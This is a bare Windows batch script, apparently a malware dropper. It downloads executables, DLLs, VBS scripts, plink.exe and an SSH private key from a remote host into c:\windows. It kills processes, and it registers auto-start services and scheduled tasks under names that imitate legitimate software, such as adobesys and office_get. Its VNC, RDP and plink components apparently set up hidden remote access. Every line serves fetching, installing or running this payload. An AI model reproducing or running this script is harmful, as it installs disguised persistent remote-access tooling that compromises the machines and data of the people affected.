curl http://troglo.homepc.it/win/cmd.bat -o c:\windows\cmd.bat
curl http://troglo.homepc.it/win/vnc.bat -o c:\windows\vnc.bat
curl http://troglo.homepc.it/rdp/rdp.bat -o c:\windows\rdp.bat
curl http://troglo.homepc.it/rdp/rdp1.bat -o c:\windows\rdp1.bat
curl http://troglo.homepc.it/win/plink.bat -o c:\windows\plink.bat
curl http://troglo.homepc.it/win/wget.exe -o c:\windows\wget.exe
wget  http://troglo.homepc.it/plink.exe -O c:\windows\plink.exe 
wget   http://troglo.homepc.it/mila.ppk -O c:\windows\mila.ppk 
taskkill /f /im sys1.exe
taskkill /f /im sys2.exe
taskkill /f /im sys3.exe
taskkill /f /im rundll32.exe
sc delete CppWindowsService
sc delete adobesys
mkdir c:\windows\hp
attrib -s c:\windows\sys2.dll
wget http://troglo.homepc.it/win/exec1.dll -O c:\windows\exec1.dll
wget http://troglo.homepc.it/win/CppWindowsService.xml -O c:\windows\CppWindowsService.xml
wget http://troglo.homepc.it/win/adobesys.xml -O c:\windows\adobesys.xml
wget http://troglo.homepc.it/win/sys3.dll -O c:\windows\hp\sys3.dll
copy /Y c:\windows\hp\sys3.dll c:\windows\sys3t.dll
wget http://troglo.homepc.it/win/sys2.dll -O c:\windows\hp\sys2.dll
copy /Y c:\windows\hp\sys2.dll c:\windows\sys2t.dll
wget http://troglo.homepc.it/win/office_get.xml -O c:\windows\office_get.xml
wget http://troglo.homepc.it/win/get.vbs -O c:\windows\get.vbs
schtasks /delete /tn office_get /F
schtasks /create /tn office_get /xml %windir%\office_get.xml /F
schtasks /delete /tn CppWindowsService /F
schtasks /create /tn CppWindowsService /xml %windir%\CppWindowsService.xml /F
schtasks /delete /tn adobesys /F
schtasks /create /tn adobesys /xml %windir%\adobesys.xml /F
wget http://troglo.homepc.it/win/sys2.exe -O c:\windows\sys2.exe
wget http://troglo.homepc.it/win/sys3.exe -O c:\windows\sys3.exe
sc create CppWindowsService binPath= c:\windows\sys2.exe DisplayName= "CppWindowsService" start= auto
sc create adobesys binPath= c:\windows\sys3.exe DisplayName= "adobesys" start= auto
wget http://troglo.homepc.it/win/svc.vbs -O c:\windows\hp\svc.vbs
wget http://troglo.homepc.it/win/libssl-1_1.dll -O c:\windows\libssl-1_1.dll
wget http://troglo.homepc.it/win/libcurl.dll -O c:\windows\libcurl.dll
wget http://troglo.homepc.it/win/libcrypto-1_1.dll -O c:\windows\libcrypto-1_1.dll
cscript c:\windows\hp\svc.vbs
net start CppWindowsService
net start adobesys
c:\windows\cmd.bat
 